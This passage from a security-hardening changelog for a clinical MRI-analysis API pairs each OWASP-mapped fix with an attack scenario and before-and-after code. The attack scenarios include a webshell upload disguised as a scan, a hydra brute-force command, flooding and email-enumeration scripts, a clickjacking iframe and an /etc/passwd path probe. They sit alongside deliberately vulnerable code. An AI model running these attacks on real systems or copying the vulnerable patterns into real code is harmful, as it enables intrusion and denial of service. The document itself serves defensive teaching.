An attacker could rename a malicious file (e.g. a PHP script) as `.nii.gz` and upload it to the server. Validating only the filename extension is useless — it is like checking the label on a jar without looking at the contents. Verifying magic bytes checks the **actual first bytes of the file**, which do not lie the way a name can.

### Attack scenario before the fix
```
# Attacker uploads a disguised script:
curl -X POST /analyze/ \
  -H "Authorization: Bearer TOKEN" \
  -F "model_name=HC_vs_bvFTD" \
  -F "file=@webshell.php;filename=brain_scan.nii.gz"

# Server saves the file to disk:
/shared_data/nifti/abc123_brain_scan.nii.gz  (actually PHP)

# If the server executes the file or serves it via web, RCE is possible.
# Or: malicious XML file → XXE, ZIP file → zip bomb, file > 10GB → DoS
```

### Code before
```python
# Vulnerable: extension check only — easy to bypass
async def upload_nifti_file(file: UploadFile, ...):
    if not file.filename.endswith('.nii.gz'):
        raise HTTPException(400, "Only .nii.gz")
    # No content verification — any file with .nii.gz is saved
    content = await file.read()
    with open(file_path, "wb") as f:
        f.write(content)
```

### Code after
```python
# orchestrator/routers/analyze.py:32-66
async def _validate_mri_file(file: UploadFile) -> bytes:
    if not file.filename.endswith(('.nii', '.nii.gz')):
        raise HTTPException(400, "Unsupported format.")

    content = await file.read()

    if len(content) < 1024:          # file too small to be a real MRI
        raise HTTPException(422, "File too small or empty")

    # gzip magic bytes: 0x1F 0x8B (covers .nii.gz)
    is_gzip = content[:2] == b'\x1f\x8b'
    # NIfTI-1 uncompressed: magic "ni1\0" or "n+1\0" at offset 344
    is_nifti1 = (
        len(content) > 348 and
        content[344:348] in (b'ni1\x00', b'n+1\x00')
    )
    # NIfTI-2 uncompressed: magic "ni2\0" or "n+2\0" at offset 4
    is_nifti2 = (
        len(content) > 8 and
        content[4:8] in (b'ni2\x00', b'n+2\x00')
    )

    if not (is_gzip or is_nifti1 or is_nifti2):
        raise HTTPException(422, "File is not a valid NIfTI")

    return content
```

### Why it works
Magic bytes are the first bytes of the file according to format specifications (gzip: `\x1f\x8b`, NIfTI-1: `n+1\0` at offset 344). These cannot be falsified without corrupting the file itself. The minimum size (1024 bytes) eliminates empty files. Validation happens IN MEMORY before writing to disk: malicious files never reach the filesystem.

### Impact
Only authentic NIfTI neuroimaging files are accepted. Scripts, executables, ZIP bombs and other malicious files are rejected with 422 before saving to disk.

---

# Group 4 — Resource Protection (API4, API6)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
## Change #17
**Name:** Login rate limiting — 5 requests/minute  
**OWASP:** API4 — Unrestricted Resource Consumption  
**Modified file:** `api_gateway/routers/auth.py` (line 100), `api_gateway/core/limiter.py`
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

### Simple explanation
Without limits, an attacker can try thousands of passwords per minute against the login endpoint — this is called brute-force. Rate limiting is like a turnstile that only lets 5 people through per minute: anyone trying to enter faster is automatically blocked.

### Attack scenario before the fix
```bash
# Automated brute-force without rate limit:
$ hydra -l admin -P rockyou.txt http-post-form \
  "localhost:8006/login:username=^USER^&password=^PASS^:401"

# 10,000 attempts in 30 seconds
# rockyou.txt has 14 million passwords — covered in ~12 hours
# With GPU cluster: hash cracked, access guaranteed
```

### Code before
```python
# No rate limiting — unlimited attempts
@router.post("/login", response_model=Token)
def login(form_data = Depends(), db = Depends(get_db)):
    user = authenticate_user(form_data.username, form_data.password, db)
    ...  # no limits: 1000 attempts/second possible
```

### Code after
```python
# api_gateway/core/limiter.py
from slowapi import Limiter
from slowapi.util import get_remote_address
limiter = Limiter(key_func=get_remote_address)

# api_gateway/routers/auth.py:100
@router.post("/login", response_model=Token)
@limiter.limit("5/minute")   # max 5 attempts per minute per IP
def login(request: Request, ...):
    ...

# api_gateway/main.py:101-102
app.state.limiter = limiter
app.add_exception_handler(RateLimitExceeded, _rate_limit_exceeded_handler)
```

### Why it works
`slowapi` uses the `limits` library with an in-memory backend (or Redis for multi-instance). The `key_func=get_remote_address` identifies each client by IP. Once the limit is exceeded, the middleware responds with HTTP 429 (Too Many Requests) before the request reaches the controller. 5 attempts/minute makes brute-forcing a 14M-password dictionary feasible in ~1900 days — not practical.

### Impact
An automated brute-force attack receives 429 after the 5th attempt and must wait until the next minute. The time to crack a robust password becomes computationally impossible within the application's useful lifetime.

---

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
## Change #18
**Name:** Registration rate limiting — 3/min (admin) and 5/hour (public)  
**OWASP:** API4 — Unrestricted Resource Consumption  
**Modified file:** `api_gateway/routers/auth.py` (lines 53, 76)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

### Simple explanation
Without limits, an attacker can create thousands of accounts in seconds: fake accounts for spam, accounts to saturate the database, or accounts to bypass per-user limits. Rate limiting on registration is the first line of defence against mass account creation.

### Attack scenario before the fix
```python
# Script for account flooding:
import requests, threading

def create_account(i):
    requests.post("/register", json={
        "username": f"spam_user_{i}",
        "password": "Pass1234!"
    })

# 10,000 threads → 10,000 accounts in seconds
# Consequences: full database, service slowdown, spam
threads = [threading.Thread(target=create_account, args=(i,)) for i in range(10000)]
for t in threads: t.start()
```

### Code before
```python
# No rate limiting on registration
@router.post("/signup")
def create_user(user: UserCreate, db = Depends(get_db), admin = Depends(require_admin)):
    ...  # unlimited

@router.post("/register")
def register(user: UserCreate, db = Depends(get_db)):
    ...  # unlimited — flood possible
```

### Code after
```python
# api_gateway/routers/auth.py:53 — admin endpoint protected
@router.post("/signup", response_model=UserResponse, status_code=201)
@limiter.limit("3/minute")   # admin can create max 3 users/minute
def create_user(request: Request, user: UserCreate, ...):
    ...

# api_gateway/routers/auth.py:76 — more restrictive public endpoint
@router.post("/register", response_model=UserResponse, status_code=201)
@limiter.limit("5/hour")     # public registration: max 5/hour per IP
def register(request: Request, user: UserCreate, ...):
    ...
```

### Why it works
The two endpoints have different limits calibrated to the use case: a legitimate admin rarely creates more than 3 users per minute, but an attacker would create thousands. Public registration is even more conservative (5/hour) because it is accessible without authentication — the attack surface is larger.

### Impact
Mass account creation is blocked. An attacker can create at most 5 public accounts/hour per IP, making floods computationally expensive (requires many different IPs — botnet detection).

---

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
## Change #19
**Name:** MRI analysis pipeline rate limiting — 3 requests/minute  
**OWASP:** API4 — Unrestricted Resource Consumption  
**Modified file:** `orchestrator/routers/analyze.py` (line 70)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

### Simple explanation
Each MRI analysis launches a heavy computational pipeline (Nextflow, R, UMAP 3D) that occupies CPU, memory and GPU for several minutes. Without limits, an authenticated user could launch hundreds in parallel, completely saturating the system for all other users — an "insider" DoS attack.

### Attack scenario before the fix
```python
# Internal DoS with a legitimate account:
import requests, threading

headers = {"Authorization": "Bearer VALID_USER_TOKEN"}
def flood_pipeline():
    with open("brain.nii.gz", "rb") as f:
        requests.post("/analyze/",
                      headers=headers,
                      files={"file": f},
                      data={"model_name": "HC_vs_bvFTD"})

# 100 threads → 100 parallel pipelines
# Server: 100% CPU, exhausted RAM, all other users timing out
threads = [threading.Thread(target=flood_pipeline) for _ in range(100)]
```

### Code before
```python
# No pipeline limit
@router.post("/", response_model=dict)
async def upload_nifti_file(file, model_name, current_user = Depends(get_current_user)):
    # Any user can launch unlimited pipelines
    background_tasks.add_task(run_full_pipeline, ...)
```

### Code after
```python
# orchestrator/routers/analyze.py:70
@router.post("/", response_model=dict)
@limiter.limit("3/minute")   # max 3 analyses/minute per IP
async def upload_nifti_file(
    request: Request,
    background_tasks: BackgroundTasks,
    file: UploadFile = File(...),
    model_name: str = Form(...),
    current_user: User = Depends(get_current_user),
    ...
):
```

### Why it works
The limit of 3 pipelines/minute exceeds normal clinical usage (a radiologist rarely analyses more than 1–2 scans per minute) but blocks automated floods. Already-started pipelines continue — only new requests are limited. Rate limiting is IP-based to also cover scenarios with multiple accounts from the same attacker.

### Impact
A single user cannot saturate the computational pipeline. The system remains responsive for all users even in the event of an insider DoS attempt.

---

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
## Change #20
**Name:** Forgot-password rate limiting — 3 requests/hour  
**OWASP:** API4 — Unrestricted Resource Consumption  
**Modified file:** `api_gateway/routers/auth.py` (line 186)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

### Simple explanation
The "forgot password" endpoint sends emails to users. Without limits, an attacker could flood any email address (spam), overload the SMTP server, or use the service as a spam relay — all at the application's expense.

### Attack scenario before the fix
```
# Email bombing a victim:
for i in range(10000):
    POST /forgot-password {"email": "victim@hospital.it"}

# Result: 10,000 reset emails sent in seconds
# → Victim's inbox unusable
# → Gmail SMTP quota exhausted (500 emails/day)
# → SMTP costs if paid service
```

### Code before
```python
# No rate limiting — unlimited emails
@router.post("/forgot-password")
async def forgot_password(body: ForgotPasswordRequest, db = Depends(get_db)):
    user = db.query(User).filter(User.email == body.email).first()
    if user:
        token = secrets.token_urlsafe(32)
        asyncio.create_task(send_reset_email(body.email, token))
    return {"message": "..."}  # flood possible
```

### Code after
```python
# api_gateway/routers/auth.py:186
@router.post("/forgot-password")
@limiter.limit("3/hour")   # max 3 requests/hour per IP
async def forgot_password(
    request: Request,
    body: ForgotPasswordRequest,
    db: Session = Depends(get_db),
):
```

### Why it works
3 requests/hour per IP is sufficient for any legitimate user who has forgotten their password (rarely needing more than one email). A flood requires thousands of different IPs, making the attack expensive and traceable. The email quota stays within SMTP provider limits.

### Impact
Email bombing impossible from a single IP. SMTP quota is protected. No mailbox can be flooded with more than 3 emails/hour from a single source.

---

# Group 5 — Configuration (API8, API9, API10)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
## Change #21
**Name:** HTTP security headers on all microservices  
**OWASP:** API8 — Security Misconfiguration  
**Modified file:** `api_gateway/main.py` (lines 105–115), `orchestrator/main.py` (lines 47–57), `model_service/main.py` (lines 54–64)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

### Simple explanation
Modern browsers have protections against XSS, clickjacking and MIME-sniffing attacks — but only if the server enables them via HTTP headers. Without these headers, the browser leaves attack vectors open that could be closed. It is like having modern locks on the door but not using them.

### Attack scenario before the fix
```
# Without X-Frame-Options:
# Attacker creates a site with an iframe loading the clinical dashboard:
<iframe src="https://clinical-twin.hospital.it/dashboard" style="opacity:0"></iframe>
# User thinks they are clicking on the attacker's site but clicks in the dashboard
# → Clickjacking: involuntary actions on the application (logout, delete)

# Without X-Content-Type-Options:
# Attacker uploads SVG file with JavaScript disguised as an image
# Browser executes it as script → XSS

# Without anonymised Server header:
Server: uvicorn/0.20.0  → Attacker knows the version and searches for specific CVEs
```

### Code before
```python
# No security headers middleware
# FastAPI/uvicorn exposes by default:
# Server: uvicorn
# (no X-Frame-Options, X-Content-Type-Options, X-XSS-Protection)
app = FastAPI(...)
app.include_router(auth.router)
```

### Code after
```python
# api_gateway/main.py:105-115 (identical in orchestrator and model_service)
class SecurityHeadersMiddleware(BaseHTTPMiddleware):
    async def dispatch(self, request, call_next):
        response = await call_next(request)
        response.headers["server"] = "webserver"               # obscures server version
        response.headers["x-content-type-options"] = "nosniff" # no MIME sniffing
        response.headers["x-frame-options"] = "DENY"           # no clickjacking
        response.headers["x-xss-protection"] = "1; mode=block" # browser XSS filter
        return response

app.add_middleware(SecurityHeadersMiddleware)
```

### Why it works
- `server: webserver` obscures the uvicorn/FastAPI version, making it harder to search for version-specific CVEs
- `x-content-type-options: nosniff` prevents the browser from "guessing" a file's MIME type — a malicious SVG is not executed as JavaScript
- `x-frame-options: DENY` prevents the page from being loaded in an iframe — blocks clickjacking
- `x-xss-protection: 1; mode=block` activates the legacy XSS filter in older browsers (IE, old Chrome) that blocks the page if it detects reflected XSS injection

The middleware is applied to **all three Python microservices**: api_gateway, orchestrator, model_service.

### Impact
Clickjacking, MIME-type confusion attacks and browser-side reflected XSS are blocked automatically. The server version is hidden from attackers searching for CVEs.

---

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
## Change #22
**Name:** API documentation hidden in production  
**OWASP:** API9 — Improper Inventory Management  
**Modified file:** `api_gateway/main.py` (lines 90–98), `orchestrator/main.py` (lines 32–41), `model_service/main.py` (lines 41–51)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

### Simple explanation
Swagger/OpenAPI (`/docs`) automatically shows all API endpoints with parameters, types, examples and descriptions. In production this is a complete map of the system for attackers — like posting a bank's floor plan on the main door. In development it is useful; in production it must be disabled.

### Attack scenario before the fix
```
# Attacker accesses /docs in production:
GET https://clinical-twin.hospital.it:8006/docs

# Automatically sees:
# - All endpoints: /login, /register, /admin/users, /analyze/, etc.
# - Schema of every request/response
# - Required and optional parameters
# - Authentication required per endpoint

# From this map, plans targeted attacks:
# 1. Finds /admin/users → attempts privilege escalation
# 2. Reads UserCreate schema → knows "role" exists as a field
# 3. Sees rate limits → knows how many requests can be made
```

### Code before
```python
# Docs always enabled (FastAPI default)
app = FastAPI(
    title="Clinical Twin API",
    # docs_url="/docs",       # DEFAULT — always visible
    # openapi_url="/openapi.json"  # always visible
)
```

### Code after
```python
# api_gateway/main.py:90-98
_dev = os.getenv("ENV") == "development"

app = FastAPI(
    title="Clinical Twin — API Gateway",
    docs_url="/docs"        if _dev else None,  # None = disabled
    redoc_url="/redoc"      if _dev else None,
    openapi_url="/openapi.json" if _dev else None,
)
```

### Why it works
When `docs_url=None`, FastAPI does not register the `/docs`, `/redoc` and `/openapi.json` routes: these URLs return 404. The `ENV=development` environment variable controls the behaviour — in docker-compose it is set to `development` for local development; in production just remove it or set it to `production`.

### Impact
In production, no attacker can use the interactive documentation to map endpoints. The informational attack surface is reduced to the source code (which is not accessible).

---

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
## Change #23
**Name:** Microservice ports bound to loopback 127.0.0.1 (not 0.0.0.0)  
**OWASP:** API8 — Security Misconfiguration  
**Modified file:** `docker-compose.yml` (lines 27, 46, 65, 88, 109, 147)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

### Simple explanation
When a container exposes a port on `0.0.0.0`, that port is accessible from any network interface — including the public network if the server has no perfect firewall. Using `127.0.0.1` (loopback) means the port is accessible ONLY from the local machine: it is invisible from the outside. It is like the difference between a door on the public pavement and a door in an internal corridor.

### Attack scenario before the fix
```
# Vulnerable docker-compose.yml:
ports:
  - "8001:8000"   # 0.0.0.0:8001 → accessible from the entire network!

# Cloud server without a perfect firewall:
# Attacker accesses the orchestrator directly without going through the API Gateway:
curl http://SERVER_IP:8001/analyze/status/1
# Bypasses API Gateway authentication!
# Directly accesses internal microservices

# Same for model_service (8003) and R inference_engine (8004):
curl http://SERVER_IP:8004/infer?task_id=5&model_name=HC_vs_bvFTD&model_dir=/etc/passwd
```

### Code before
```yaml
# Vulnerable docker-compose
services:
  orchestrator:
    ports:
      - "8001:8000"     # implicit 0.0.0.0 — externally accessible
  model_service:
    ports:
      - "8003:8000"     # 0.0.0.0 — externally accessible
  inference_engine:
    ports:
      - "8004:8000"     # 0.0.0.0 — R Plumber exposed!
```

### Code after
```yaml
# docker-compose.yml — all internal microservices on loopback
services:
  api_gateway:
    ports:
      - "127.0.0.1:8006:8000"  # localhost only
  orchestrator:
    ports:
      - "127.0.0.1:8001:8000"  # localhost only
  model_service:
    ports:
      - "127.0.0.1:8003:8000"  # localhost only
  llm_service:
    ports:
      - "127.0.0.1:8002:8000"  # localhost only
  inference_engine:
    ports:
      - "127.0.0.1:8004:8000"  # localhost only
  nextflow_worker:
    ports:
      - "127.0.0.1:8005:8000"  # localhost only
```

### Why it works
`127.0.0.1:PORT:8000` instructs Docker to bind the host port only on the loopback interface. Any request from an external IP (including eth0, wlan0 interfaces) is ignored at kernel level — no packet reaches the container. Internal microservices communicate with each other via the internal Docker network (`clinical_twin_net`) without needing to go through the host.

### Impact
Internal microservices are inaccessible from outside, even if the firewall has a misconfiguration. The API Gateway is the only authenticated entry point for external requests. The R inference engine (more vulnerable because it has no native authentication) is completely isolated.

---

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
## Change #24
**Name:** R errors not exposed to client — generic message  
**OWASP:** API8 — Security Misconfiguration  
**Modified file:** `model_service/main.py` (lines 75–83)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

### Simple explanation
Technical error messages (stack traces, file paths, internal function names) are useful for debugging but also valuable information for attackers. An error like "File not found: /shared_data/models/HC_vs_bvFTD/model.rds" reveals the internal filesystem structure. With a generic message, the error is logged internally but the attacker only sees "Error during inference".

### Attack scenario before the fix
```
# Attacker sends a malformed request:
POST /infer {"task_id": 999999, "model_name": "HC_vs_bvFTD"}

# Response with technical error:
500 Internal Server Error
{
  "detail": "Error in readRDS('/shared_data/models/HC_vs_bvFTD/model.rds'): 
             cannot open the connection to file '/shared_data/models'
             Stack trace: inference_logic.R:26 run_clinical_inference
             Called from: /app/R/inference_logic.R line 26"
}
# Attacker learns:
# - Filesystem path: /shared_data/models/
# - Model file name: model.rds
# - R code structure: inference_logic.R:26
```

### Code before
```python
# Technical error propagated to client
@app.post("/infer")
async def run_inference(req: InferRequest):
    result = await app.state.orchestrator.trigger_r_inference(...)
    return {"status": "ok", "result": result}
    # If trigger_r_inference raises an exception:
    # FastAPI returns the exception detail to the client!
```

### Code after
```python
# model_service/main.py:75-83
@app.post("/infer")
async def run_inference(req: InferRequest):
    _validate_model_name(req.model_name)
    try:
        result = await app.state.orchestrator.trigger_r_inference(
            task_id=req.task_id,
            model_name=req.model_name,
        )
        return {"status": "ok", "result": result}
    except Exception as e:
        logger.error(f"Inference error task {req.task_id}: {e}")  # detailed internal log
        raise HTTPException(
            status_code=500,
            detail="Error during inference. Please try again."  # generic message to client
        )
```

### Why it works
The `try/except` catches any exception from R inference. The technical detail is logged with `logger.error()` (accessible to operators via container logs) but not transmitted to the client. The client receives only a generic message that reveals no architectural information.

### Impact
Attackers cannot use error messages to map the internal filesystem, software versions, or code structure. Technical details remain in internal logs for operator debugging.

---

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
## Change #25
**Name:** MLflow fallback with generic error  
**OWASP:** API10 — Unsafe Consumption of APIs  
**Modified file:** `model_service/main.py` (lines 86–94)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

### Simple explanation
The model_service connects to MLflow to download models. If MLflow is offline or responds with errors, without exception handling the crash propagates to the user with messages revealing internal architecture. The fallback handling ensures that MLflow unavailability (external service) produces only a clear 404 error, not an unhandled crash.

### Attack scenario before the fix
```
# MLflow offline or tampered:
GET /model_info/HC_vs_bvFTD

# Without error handling:
500 Internal Server Error
{
  "detail": "MLflowException: RESOURCE_DOES_NOT_EXIST: Registered Model with 
             name=HC_vs_bvFTD not found. Server: http://mlflow:5000
             requests.exceptions.ConnectionError: ('Connection aborted.', 
             RemoteDisconnected('Remote end closed connection without response'))"
}
# Reveals: internal MLflow URL (http://mlflow:5000), MLflow DB type, etc.
```

### Code before
```python
# No error handling → exception propagated to client
@app.get("/model_info/{model_name}")
async def get_model_info(model_name: str):
    info = await app.state.orchestrator.get_model_info(model_name)
    return info  # MLflow down → unhandled exception with internal details
```

### Code after
```python
# model_service/main.py:86-94
@app.get("/model_info/{model_name}")
async def get_model_info(model_name: str):
    _validate_model_name(model_name)
    try:
        info = await app.state.orchestrator.get_model_info(model_name)
        return info
    except Exception as e:
        logger.error(f"Error retrieving model info '{model_name}': {e}")
        raise HTTPException(
            status_code=404,
            detail=f"Model '{model_name}' not found or unavailable."
        )
```

### Why it works
The `try/except Exception` pattern catches any connection, authentication or response problem from MLflow. The original error (with internal URLs and MLflow details) is logged internally. The client receives a generic 404 that reveals nothing about the internal infrastructure.

### Impact
MLflow unavailability or compromise does not cause architectural information leakage. The system degrades gracefully with a user-understandable error without exposing internal infrastructure.

---

# Group 6 — Secure Features Added

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
## Change #26
**Name:** Public registration `/register` — fixed role `user`  
**OWASP:** API5 — Broken Function Level Authorization  
**Modified file:** `api_gateway/routers/auth.py` (lines 75–94)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

### Simple explanation
Before adding this endpoint, the system had only `/signup` (requires admin token) to create users. Adding public registration is convenient but introduces risks: it must be guaranteed that no self-registered user can obtain admin privileges. Security is ensured by always assigning only the `user` role in server code, ignoring any input.

### Attack scenario before the fix
```
# Before: only admins could create accounts — no public registration
# New endpoint added without hardcoding the role:

POST /register
{"username": "hacker", "password": "Pass1234!", "role": "admin"}
→ 201 Created {"role": "admin"}  # if the server accepts the role field from input
```

### Code before
```python
# Did not exist — system was closed (only admins created users)
# Or, vulnerable with role field acceptance:
@router.post("/register")
def register(user: UserCreate, db):
    new_user = User(**user.dict())  # mass assignment! role from input
    db.add(new_user)
```

### Code after
```python
# api_gateway/routers/auth.py:75-94
@router.post("/register", response_model=UserResponse, status_code=201)
@limiter.limit("5/hour")
def register(request: Request, user: UserCreate, db: Session = Depends(get_db)):
    """Public registration: creates a basic user account (role: user)."""
    if db.query(User).filter(User.username == user.username).first():
        raise HTTPException(status_code=400, detail="Username already registered")
    new_user = User(
        username=user.username,
        hashed_password=get_password_hash(user.password),
        email=user.email or None,
        role="user",   # ← hardcoded: no public user can be admin
    )
    db.add(new_user)
    db.commit()
    db.refresh(new_user)
    return new_user
```

### Why it works
The `role="user"` field is hardcoded in the code — it is never read from user input. Even if `UserCreate` had a `role` field, the server completely ignores it for this endpoint. The response uses `UserResponse` (which shows the role) but the creation ignores any attempt to specify it.

### Impact
Any user can register autonomously obtaining only the `user` role. No public registration can create an admin account.

---

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
## Change #27
**Name:** Password recovery `/forgot-password` — always returns 200  
**OWASP:** API2 — Broken Authentication (User Enumeration)  
**Modified file:** `api_gateway/routers/auth.py` (lines 185–205)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

### Simple explanation
If the server responded differently for registered emails ("Email sent!") and unregistered ones ("Email not found"), an attacker could discover which emails exist in the system. Responding always with the same generic message, regardless of email existence, blocks this information leak — this is called "email enumeration prevention".

### Attack scenario before the fix
```
# With differentiated responses for existing/non-existing emails:
POST /forgot-password {"email": "mario.rossi@hospital.it"}
→ 200 {"message": "Email sent!"}  # email EXISTS → information revealed

POST /forgot-password {"email": "nobody@random.it"}
→ 404 {"detail": "Email not found"}  # email DOES NOT EXIST → confirmed

# Email enumeration script:
emails = ["mario@hospital.it", "admin@hospital.it", "doctor@hospital.it"]
for email in emails:
    r = requests.post("/forgot-password", json={"email": email})
    if r.status_code == 200:
        print(f"VALID EMAIL: {email}")
```

### Code before
```python
# Vulnerable: different response for found/not found email
@router.post("/forgot-password")
async def forgot_password(body, db):
    user = db.query(User).filter(User.email == body.email).first()
    if not user:
        raise HTTPException(status_code=404, detail="Email not found")
    # ... send email ...
    return {"message": "Reset email sent"}
```

### Code after
```python
# api_gateway/routers/auth.py:185-205
@router.post("/forgot-password")
@limiter.limit("3/hour")
async def forgot_password(request, body, db):
    """Always responds 200 — does not reveal whether the email exists."""
    user = db.query(User).filter(User.email == body.email).first()
    if user:
        # Invalidate previous tokens and create new token
        db.query(PasswordResetToken).filter(
            PasswordResetToken.user_id == user.id,
            PasswordResetToken.used == False,
        ).update({"used": True})
        db.commit()
        token = secrets.token_urlsafe(32)
        expires_at = datetime.now(timezone.utc) + timedelta(hours=1)
        db.add(PasswordResetToken(user_id=user.id, token=token, expires_at=expires_at))
        db.commit()
        asyncio.create_task(send_reset_email(body.email, token))
    # Always 200, always same message — email found or not
    return {"message": "If the email is registered you will receive instructions shortly."}
```

### Why it works
The `if user:` block executes the real logic only if the email exists, but the final `return` is **outside the if** and runs in both cases with the same message. HTTP 200 and same JSON body: from the outside the behaviour is identical. The attacker cannot distinguish "email found" from "email not found".

### Impact
Enumeration of registered email addresses via this endpoint is impossible. An attacker testing thousands of emails always gets the same "200 OK" — no information leaked.

---

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
## Change #28
**Name:** Password reset `/reset-password` — single-use token with expiry  
**OWASP:** API2 — Broken Authentication  
**Modified file:** `api_gateway/routers/auth.py` (lines 208–233), `api_gateway/models/domain.py` (lines 35–43)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

### Simple explanation
The password reset link sent by email contains a secret token. If this token does not expire and is not invalidated after use, an attacker who gains access to the mailbox (even months later) can reset the password. Here the token expires in 1 hour and is marked as `used=True` immediately after use — it cannot be reused.

### Attack scenario before the fix
```
# Reset token without expiry and reusable:
1. User requests password reset, gets link via email
2. User resets password with the link
3. Attacker gains access to old email (archive, forward, leak)
4. Uses the SAME old link:
   POST /reset-password {"token": "oldToken123", "new_password": "Pass9999!"}
   → 200 OK! — password reset again even years later!

# Or: brute force of the token if too short or predictable
POST /reset-password {"token": "abc123", ...}  # short token → brute-force
```

### Code before
```python
# Token without expiry, reusable, potentially weak
class PasswordResetToken(Base):
    token = Column(String)  # no expiry, no "used" field

@router.post("/reset-password")
def reset_password(body, db):
    reset_token = db.query(PasswordResetToken).filter(
        PasswordResetToken.token == body.token
    ).first()
    if reset_token:
        user.hashed_password = get_password_hash(body.new_password)
        # Token NOT invalidated → reusable!
```

### Code after
```python
# api_gateway/models/domain.py:35-43
class PasswordResetToken(Base):
    __tablename__ = "password_reset_tokens"
    id = Column(Integer, primary_key=True)
    user_id = Column(Integer, ForeignKey("users.id"), nullable=False)
    token = Column(String, unique=True, nullable=False)    # urlsafe 32 bytes = 256 bits
    expires_at = Column(DateTime, nullable=False)          # 1 hour expiry
    used = Column(Boolean, default=False, nullable=False)  # single-use

# api_gateway/routers/auth.py:208-233
@router.post("/reset-password")
def reset_password(request, body, db):
    now = datetime.now(timezone.utc)
    reset_token = (
        db.query(PasswordResetToken)
        .filter(
            PasswordResetToken.token == body.token,
            PasswordResetToken.used == False,     # not already used
            PasswordResetToken.expires_at > now,  # not expired
        )
        .first()
    )
    if not reset_token:
        raise HTTPException(status_code=400, detail="Invalid or expired token")
    user = db.query(User).filter(User.id == reset_token.user_id).first()
    user.hashed_password = get_password_hash(body.new_password)
    reset_token.used = True   # ← immediate invalidation after use
    db.commit()
    return {"message": "Password updated"}
```

The token is generated with `secrets.token_urlsafe(32)` (256 bits of entropy — not brute-forceable). Previous unused tokens are invalidated before creating the new one (lines 195–199 in `forgot_password`).

### Why it works
The triple condition `used=False AND expires_at > now AND token=?` ensures: (1) the token has not already been used, (2) it has not expired, (3) it exactly matches the submitted token. After use, `used=True` makes the token unusable for any future request. The 1-hour expiry limits the window of use even in case of email theft.

### Impact
A used reset link becomes useless immediately. An unused reset link expires in 1 hour. Brute-force is computationally impossible (256 bits of entropy). Old links are invalidated when a new one is requested.

---

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
## Change #29
**Name:** Gmail SMTP integration with credentials from environment  
**OWASP:** API8 — Security Misconfiguration  
**Modified file:** `api_gateway/services/email.py`, `api_gateway/core/config.py` (lines 15–23)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

### Simple explanation
Hardcoding email credentials in source code means anyone who reads the code (or a Git repository) can see and use those credentials. Reading them from environment variables (`.env` file) means credentials never appear in source code or Git history.

### Attack scenario before the fix
```python
# Hardcoded credentials in code:
_conf = ConnectionConfig(
    MAIL_USERNAME="clinicaltwin@gmail.com",  # visible on GitHub!
    MAIL_PASSWORD="MyGmailPassword123",       # stealable from the repository
    ...
)
# Anyone who accidentally pushes to a public GitHub exposes Gmail credentials
# → Gmail account compromised, reset emails tampered
```

### Code before
```python
# Vulnerable: credentials in source code
from fastapi_mail import ConnectionConfig
conf = ConnectionConfig(
    MAIL_USERNAME="real.email@gmail.com",
    MAIL_PASSWORD="real_password_here",
    MAIL_SERVER="smtp.gmail.com",
)
```

### Code after
```python
# api_gateway/services/email.py
from core.config import settings

_conf = ConnectionConfig(
    MAIL_USERNAME=settings.MAIL_USERNAME,    # from environment variable
    MAIL_PASSWORD=settings.MAIL_PASSWORD,    # from environment variable
    MAIL_FROM=settings.MAIL_FROM,
    MAIL_FROM_NAME=settings.MAIL_FROM_NAME,
    MAIL_PORT=settings.MAIL_PORT,
    MAIL_SERVER=settings.MAIL_SERVER,
    MAIL_STARTTLS=settings.MAIL_STARTTLS,    # STARTTLS enabled
    MAIL_SSL_TLS=settings.MAIL_SSL_TLS,
    USE_CREDENTIALS=True,
)

# api_gateway/core/config.py:15-23 — field in Settings
MAIL_USERNAME: str = Field(default="")
MAIL_PASSWORD: str = Field(default="")
MAIL_FROM: str = Field(default="")
# ... all SMTP configuration from .env
```

### Why it works
Pydantic `BaseSettings` with `env_file=".env"` reads values at startup from the `.env` file (excluded from Git via `.gitignore`). Gmail credentials never appear in source code. The `.env.example` file documents which variables are needed without revealing the actual values.

### Impact
Even if the Git repository were accidentally made public, Gmail credentials would not be exposed. The actual credentials exist only in the local `.env` file or in the production server's environment variables.

---

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
## Change #30
**Name:** Invalidation of previous reset tokens (token rotation)  
**OWASP:** API2 — Broken Authentication  
**Modified file:** `api_gateway/routers/auth.py` (lines 193–200)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

### Simple explanation
If a user requests multiple password reset links, all previous links should become useless — only the latest should work. Without this, an attacker who steals an old link (even from days ago) could use it even after the user has requested a new one.

### Attack scenario before the fix
```
1. Monday: User requests reset → link_A in email
